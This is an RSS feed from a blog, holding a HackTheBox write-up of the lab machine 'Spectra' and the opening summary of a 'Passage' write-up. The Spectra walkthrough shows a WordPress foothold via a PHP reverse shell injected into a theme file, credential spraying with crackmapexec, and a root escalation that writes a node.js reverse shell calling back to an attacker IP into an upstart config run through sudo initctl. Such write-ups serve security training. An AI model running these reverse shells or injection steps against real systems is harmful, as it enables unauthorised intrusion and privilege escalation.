<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Webshell on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/webshell/</link>
    <description>Recent content in Webshell on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 26 Jun 2021 21:27:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/webshell/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&amp;rsquo;m able to inject a PHP code into a theme file to get a foothold on the system.</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Internal enumeration finds an auto-login password and the password is reused by the user. The user has sudo privileges on <code>initctl</code>, which can be leveraged to get a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting WordPress</li>
<li>Command injection</li>
<li>Exploiting sudo privileges on initctl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-15 10:10 EDT
Nmap scan report <span class="k">for</span> 10.10.10.229
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.052s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.17.4
3306/tcp open  mysql   syn-ack ttl <span class="m">63</span> MySQL <span class="o">(</span>unauthorized<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 123.14 seconds
</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
$ curl -s http://spectra.htb/ <span class="p">|</span> wc -c
<span class="m">283</span>
→ root@kali «~» «10.10.14.9» 
$ curl -s http://10.10.10.229 <span class="p">|</span> wc -c
<span class="m">283</span>
</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
</p>
<p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p>
<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl http://spectra.htb/testing/wp-config.php.save
&lt;?php
...&lt;SNIP&gt;...

define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database username */
define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;devtest&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database password */
define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;devteam01&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL hostname */
define<span class="o">(</span> <span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span> <span class="o">)</span><span class="p">;</span>
...&lt;SNIP&gt;...
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nc -nvlp <span class="m">9001</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">35166</span>
Linux spectra 5.4.66+ <span class="c1">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
 09:14:42 up 10:53,  <span class="m">0</span> users,  load average: 0.02, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
$ hostname
spectra
</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ which python3
which: no python3 in <span class="o">((</span>null<span class="o">))</span>
$ ls /usr/bin/ <span class="p">|</span> grep python 
python
python-config
python-wrapper
python2
python2.7
python3
python3.6
python3.6m
$ /usr/bin/python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
nginx@spectra / $ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
nginx@spectra / $ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> suspended  nc -nvlp <span class="m">9001</span>
→ root@kali «spectra» «10.10.14.21» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> continued  nc -nvlp <span class="m">9001</span>

nginx@spectra / $ 
</code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
<span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nv">USER</span><span class="o">=</span>nginx
<span class="nv">PWD</span><span class="o">=</span>/
<span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
<span class="nv">HOME</span><span class="o">=</span>/home/nginx
<span class="nv">_</span><span class="o">=</span>/usr/bin/env
nginx@spectra / $ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin 
nginx@spectra / $ which python
/usr/local/bin/python
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd <span class="p">|</span> grep sh$  
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
</code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
...&lt;SNIP&gt;...
/home/katie:
total <span class="m">8</span>
drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
...&lt;SNIP&gt;...
</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
/usr/local/share/nginx/html/main/wp-config.php
/usr/local/share/nginx/html/testing/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
...&lt;SNIP&gt;...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database <span class="k">for</span> WordPress */
define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database username */
define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database password */
define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;development01&#39;</span> <span class="o">)</span><span class="p">;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
<span class="c1"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
<span class="c1"># Use of this source code is governed by a BSD-style license that can be</span>
<span class="c1"># found in the LICENSE file.</span>
description   <span class="s2">&#34;Automatic login at boot&#34;</span>
author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
<span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
<span class="c1"># input.</span>
start on started boot-complete
script
  <span class="nv">passwd</span><span class="o">=</span>
  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
      <span class="nb">break</span>
    <span class="k">fi</span>
  <span class="k">done</span>
  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">exit</span> <span class="m">0</span>
  <span class="k">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">19</span> Feb  <span class="m">3</span> 16:43 passwd
nginx@spectra /opt $ cat /etc/autologin/passwd 
SummerHereWeCome!!
</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.1
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:SummerHereWeCome!! Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>+<span class="o">]</span> katie:SummerHereWeCome!!
</code></pre></div><p>I&rsquo;m able to login via SSH</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ ssh katie@10.10.10.229
Password: 
katie@spectra ~ $ id 
<span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
total <span class="m">36</span>
drwxr-xr-x <span class="m">5</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .
drwxr-xr-x <span class="m">8</span> root  root  <span class="m">4096</span> Feb  <span class="m">2</span> 15:55 ..
lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Feb  <span class="m">2</span> 15:55 .bash_history -&gt; /dev/null
-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">127</span> Dec <span class="m">22</span> 05:46 .bash_logout
-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">204</span> Dec <span class="m">22</span> 05:46 .bash_profile
-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">551</span> Dec <span class="m">22</span> 05:46 .bashrc
drwx------ <span class="m">2</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .gnupg
drwx------ <span class="m">3</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 .pki
drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
    <span class="m">32121</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test6.conf
    <span class="m">32123</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test7.conf
    <span class="m">32109</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test3.conf
    <span class="m">32112</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test4.conf
    <span class="m">32103</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test.conf
    <span class="m">32126</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test8.conf
    <span class="m">32128</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test9.conf
    <span class="m">32106</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test10.conf
    <span class="m">32108</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test2.conf
    <span class="m">32120</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test5.conf
    <span class="m">32105</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test1.conf
    <span class="m">23763</span>      <span class="m">4</span> -rwxrwxr-x   <span class="m">1</span> root     developers      <span class="m">251</span> Jun <span class="m">29</span>  <span class="m">2020</span> /srv/nodetest.js
</code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  The JS file itself is not that important here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
description <span class="s2">&#34;Test node.js server&#34;</span>
author      <span class="s2">&#34;katie&#34;</span>

start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
stop on shutdown

script

    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
end script
</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p>
<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ cat exploit.conf
description <span class="s2">&#34;Test node.js server&#34;</span>
author      <span class="s2">&#34;katie&#34;</span>

start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
stop on shutdown

script

    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
    <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.14.21
    <span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">9001</span>
    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class="s1">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span><span class="s1">    this.pipe(sh.stdin);
</span><span class="s1">    sh.stdout.pipe(this);
</span><span class="s1">    sh.stderr.pipe(this);
</span><span class="s1">    })&#39;</span>
    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ scp exploit.conf katie@10.10.10.229:/dev/shm
Password:
bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class="p">;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
exploit.conf                               100%  <span class="m">775</span>    13.1KB/s   00:00
</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class="p">;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class="o">&amp;&amp;</span> sudo /sbin/initctl start test5
test5 start/running, process <span class="m">33889</span>
</code></pre></div><p>If I check my listener, I have a root shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
$ nc -nvlp <span class="m">9001</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">37220</span>
id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span> ip a
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
spectra
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
       valid_lft 86303sec preferred_lft 14303sec
    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
       valid_lft 86303sec preferred_lft 14303sec
    inet6 fe80::250:56ff:feb9:b2c/64 scope link
       valid_lft forever preferred_lft forever
</code></pre></div><p><img class="img-container" src="imgs/image-20210715085053464.png" alt="image-20210715085053464"  />
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
      <content:encoded><![CDATA[<p>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
